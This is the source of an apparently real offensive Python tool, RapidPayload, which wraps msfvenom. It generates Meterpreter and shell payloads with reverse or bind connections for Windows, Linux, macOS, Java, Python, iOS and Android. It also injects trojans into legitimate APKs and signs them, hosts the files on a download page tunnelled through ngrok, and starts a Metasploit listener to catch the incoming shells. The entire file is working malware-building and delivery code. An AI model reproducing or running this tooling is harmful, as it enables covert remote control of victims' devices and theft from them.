#!/usr/bin/python
#-*- coding: utf-8 -*-
#https://github.com/AngelSecurityTeam/RapidPayload
import os
import platform,subprocess,re
from time import sleep
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def banner():
    print(''' {1}{0}{1}
    ____              _     ______              __                __
   / __ \____ _____  (_)___/ / __ \____ ___  __/ /___  ____ _____/ /
  / /_/ / __ `/ __ \/ / __  / /_/ / __ `/ / / / / __ \/ __ `/ __  / 
 / _, _/ /_/ / /_/ / / /_/ / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ /  
/_/ |_|\__,_/ .___/_/\__,_/_/    \__,_/\__, /_/\____/\__,_/\__,_/   
           /_/                        /____/  {2}AngelSecurityTeam{0}
'''.format(end,bold,cyan))


def main(platform, type):
    lhost = input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    nameFile = input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        ext= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        ext= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        ext= '.exe'
    if platform == 'Windows' and type == '4':
        payload= 'windows/meterpreter/bind_tcp'
        format= 'exe'
        ext= '.exe'
    if platform == 'Windows' and type == '5':
        payload= 'windows/shell/bind_tcp'
        format= 'exe'
        ext= '.exe'
    if platform == 'Windows' and type == '6':
        payload= 'windows/shell/reverse_tcp'
        format= 'exe'
        ext= '.exe'        
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/meterpreter_reverse_http'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter_reverse_https'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '3':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '4':
        payload= 'linux/x64/meterpreter_reverse_http'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '5':
        payload= 'linux/x64/meterpreter_reverse_https'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '6':
        payload= 'linux/x64/meterpreter/reverse_tcp'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '7':
        payload= 'linux/x86/shell/reverse_tcp'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '8':
        payload= 'linux/x64/shell/bind_tcp'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '9':
        payload= 'linux/x86/meterpreter/bind_tcp'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '10':
        payload= 'linux/x64/meterpreter/bind_tcp'
        format= 'elf'
        ext= '.elf' 
    if platform == 'Linux' and type == '11':
        payload= 'linux/x86/shell/bind_tcp'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '12':
        payload= 'linux/x64/shell/reverse_tcp'
        format= 'elf'
        ext= '.elf'                                                                  
    if platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        ext= '.py'
    if platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        ext= '.py'
    if platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        ext= '.py'
    if platform == 'Python' and type == '4':
        payload= 'python/meterpreter/bind_tcp'
        format= 'raw'
        ext= '.py'
    if platform == 'Macosx' and type == '1':
        payload= 'osx/x86/shell_reverse_tcp'
        format= 'macho'
        ext= '.macho'
    if platform == 'Macosx' and type == '2':
        payload= 'osx/x86/shell_bind_tcp'
        format= 'macho'
        ext= '.macho'
    if platform == 'Macosx' and type == '3':
        payload= 'osx/x64/meterpreter/bind_tcp'
        format= 'macho'
        ext= '.bin'
    if platform == 'Macosx' and type == '4':
        payload= 'osx/x64/meterpreter/reverse_tcp'
        format= 'macho'
        ext= '.bin'
    if platform == 'Macosx' and type == '5':
        payload= 'osx/x64/meterpreter_reverse_http'
        format= 'macho'
        ext= '.bin'
    if platform == 'Macosx' and type == '6':
        payload= 'osx/x64/meterpreter_reverse_https'
        format= 'macho'
        ext= '.bin'
    if platform == 'Java' and type == '1':
        payload= 'java/meterpreter/reverse_http'
        format= 'jar'
        ext= '.jar'
    if platform == 'Java' and type == '2':
        payload= 'java/meterpreter/reverse_https'
        format= 'jar'
        ext= '.jar'
    if platform == 'Java' and type == '3':
        payload= 'java/meterpreter/reverse_tcp'
        format= 'jar'
        ext= '.jar'
    if platform == 'Java' and type == '4':
        payload= 'java/meterpreter/bind_tcp'
        format= 'jar'
        ext= '.jar'
    if platform == 'Apple_ios' and type == '1':
        payload= 'apple_ios/aarch64/meterpreter_reverse_http'
        format= 'macho'
        ext= '.macho'
    if platform == 'Apple_ios' and type == '2':
        payload= 'apple_ios/aarch64/meterpreter_reverse_https'
        format= 'macho'
        ext= '.macho' 
    if platform == 'Apple_ios' and type == '3':
        payload= 'apple_ios/aarch64/meterpreter_reverse_tcp'
        format= 'macho'
        ext= '.macho' 
    if platform == 'Apple_ios' and type == '4':
        payload= 'apple_ios/aarch64/shell_reverse_tcp'
        format= 'macho'
        ext= '.macho' 
    if platform == 'Apple_ios' and type == '5':
        payload= 'apple_ios/armle/meterpreter_reverse_http'
        format= 'macho'
        ext= '.macho' 
    if platform == 'Apple_ios' and type == '6':
        payload= 'apple_ios/armle/meterpreter_reverse_https'
        format= 'macho'
        ext= '.macho' 
    if platform == 'Apple_ios' and type == '7':
        payload= 'apple_ios/armle/meterpreter_reverse_tcp'
        format= 'macho'
        ext= '.macho'                                                                                                                                         
    print("\033[1m\033[36m")
    os.system('sudo msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o '+nameFile+ext)
    os.system('sudo chmod +x '+nameFile+ext)
    sleep(3)


def legit(platform, type):
    lhost = input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    direct = input("\n{0}{1}RapidPayload:~/Path_of_your_APK# {2}".format(cyan, bold, end))
    newname = input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))                    
    if platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        ext= '.apk'
    if platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        ext= '.apk'        
    if platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        ext= '.apk'         
    print("\033[1m\033[36m")
    os.system('sudo msfvenom -p '+payload+' -x '+direct+' LHOST='+lhost+' LPORT='+lport+' -o '+newname+ext)      
    sleep(3)

def Normal(platform, type):
    lhost = input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    newname = input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))                    
    if platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        ext= '.apk'
    if platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        ext= '.apk'        
    if platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        ext= '.apk'         
    print("\033[1m\033[36m")
    os.system('sudo msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -o '+newname+ext)
    print("\n\033[1m\033[36m#|signing APK|#\n\033[1m\033[36m")
    os.system("keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000")
    os.system('jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore '+newname+ext+' alias_name')
    os.system("rm -rf my-release-key.keystore")
    sleep(3)

def Ngrok():
    print("\033[1m\033[36m")
    os.system("ls")	
    print("")
    name1=input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
    
    def index_defaultNgrok():
    
        with open("index.html", "w") as file:
            file.write("""
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- AngelSecurityTeam -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}
.btn:hover {
  background-color: RoyalBlue;
}
</style>	
<title></title>
<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
</head>
<body>
<div class="wrapper">
<center>
<!-- AngelSecurityTeam -->
<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name1+"""' ">
</center>
</a>
</div>
</body>
</html> 
          """)    
    
    index_defaultNgrok()
    #http.server 80
    os.system("python3 -m http.server 80 > .server 2> /dev/null &")          
    os.system("chmod +x ngrok")
    #http.server 80 NGROK
    portN=80
    os.system("./ngrok http {} > /dev/null &".format(portN))
    sleep(8)
    os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
    urlFile = open('link2.url', 'r')
    url = urlFile.read()
    urlFile.close()
    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:		
      print("\n\033[1m\033[36mRapidPayload:~/LinkNgrok# \033[1m\033[0m"+url)
   
    print(" ")	

def localhost():
    print("\033[1m\033[36m")
    os.system("ls")	
    print("")
    name2=input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
    
    def index_defaultlocalhost():
    
        with open("index.html", "w") as file:
            file.write("""
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- AngelSecurityTeam -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}
.btn:hover {
  background-color: RoyalBlue;
}
</style>	
<title></title>
<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
</head>
<body>
<div class="wrapper">
<center>
<!-- AngelSecurityTeam -->
<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name2+"""' ">
</center>
</a>
</div>
</body>
</html> 
          """)    
    
    index_defaultlocalhost()
    #http.server 80
    os.system("python3 -m http.server 80 > .server 2> /dev/null &")          		
    print("\n\033[1m\033[36mRapidPayload:~/Link_LocalHost# \033[1m\033[0m"+"http://localhost:80")
   
    print(" ")


def MSF():
    host1=input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    port1=input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    payload1=input("\n{0}{1}RapidPayload:~/PAYLOAD# {2}".format(cyan, bold, end))   
    datamsf = "use exploit/multi/handler;set PAYLOAD "+payload1+";set LHOST "+host1+";set LPORT "+port1+";run"
    subprocess.call(["msfconsole", "-q" ,"-x", datamsf])    
         
     
def RapidP():
    
    select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2} Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2} Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2} Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2} Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2} MacOS\n{0}{2}[{1}{2}{2}6{0}]{1} {2} Java\n{0}{2}[{1}{2}{2}7{0}]{1} {2} Apple_ios\n{0}{2}[{1}{2}{2}8{0}]{1} {2} Connect_Ngrok\n{0}{2}[{1}{2}{2}9{0}]{1} {2} Connect_LocalHost\n{0}{2}[{1}{2}{2}10{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2} Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
    if select == '1':        
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}windows/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}windows/shell/bind_tcp\n{0}[{1}{2}6{0}]{1} {2}windows/shell/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Windows', type)
    if select == '2':       
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2} linux/x86/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2} linux/x86/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2} linux/x86/meterpreter/reverse_tcp{0}{1}\n{0}[{1}{2}4{0}]{1} {2} linux/x64/meterpreter/reverse_http{0}{1}\n{0}[{1}{2}5{0}]{1} {2} linux/x64/meterpreter/reverse_https{0}{1}\n{0}[{1}{2}6{0}]{1} {2} linux/x64/meterpreter/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2} linux/x86/shell/reverse_tcp{0}\n{0}[{1}{2}8{0}]{1} {2} linux/x64/shell/bind_tcp\n{0}[{1}{2}9{0}]{1} {2} linux/x86/meterpreter/bind_tcp\n{0}[{1}{2}10{0}]{1} {2}linux/x64/meterpreter/bind_tcp\n{0}[{1}{2}11{0}]{1} {2}linux/x86/shell/bind_tcp\n{0}[{1}{2}12{0}]{1} {2}linux/x64/shell/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2} Menu\n\n{0}{2}RapidPayload:~/Linux#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Linux', type)
    if select == '3':
        droi = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}Normal\n{0}[{1}{2}2{0}]{1} {2}Infect Legitimate APK\n{0}{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
        if droi == '1':				
            type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}android/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}android/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}android/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
            if type == '0':
                RapidP()            
            Normal('Android', type)
        if droi == '2':				
            type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}android/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}android/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}android/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
            if type == '0':
                RapidP()            
            legit('Android', type)            
    if select == '4':
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}python/meterpreter/bind_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Python', type)
    if select == '5':        
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}osx/x86/shell_reverse_tcp\n{0}[{1}{2}2{0}]{1} {2}osx/x86/shell_bind_tcp\n{0}[{1}{2}3{0}]{1} {2}osx/x64/meterpreter/bind_tcp\n{0}[{1}{2}4{0}]{1} {2}osx/x64/meterpreter/reverse_tcp\n{0}[{1}{2}5{0}]{1} {2}osx/x64/meterpreter_reverse_http\n{0}[{1}{2}6{0}]{1} {2}osx/x64/meterpreter_reverse_https\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/MacOS#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Macosx', type)
    if select == '6':        
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}java/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}java/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}java/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}java/meterpreter/bind_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Java#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Java', type)
    if select == '7':        
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_http\n{0}[{1}{2}2{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_https\n{0}[{1}{2}3{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}apple_ios/aarch64/shell_reverse_tcp\n{0}[{1}{2}5{0}]{1} {2}apple_ios/armle/meterpreter_reverse_http\n{0}[{1}{2}6{0}]{1} {2}apple_ios/armle/meterpreter_reverse_https\n{0}{2}[{1}{2}1{0}]{1} {2}apple_ios/armle/meterpreter_reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Apple_ios#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Apple_ios', type)                          
    if select == '8':
        Ngrok()
    if select == '9':
        localhost()        
    if select == '10':
        MSF()                
    elif select == '0':
        print("\n")
        os.system("fuser -k -n tcp 80") # kill PORT 80
        exit(0)
    else:
        sleep(2)
        RapidP()

if __name__ == "__main__":
    try:
        banner()     
        RapidP()
    except KeyboardInterrupt:
        print("\n")
        exit(0)
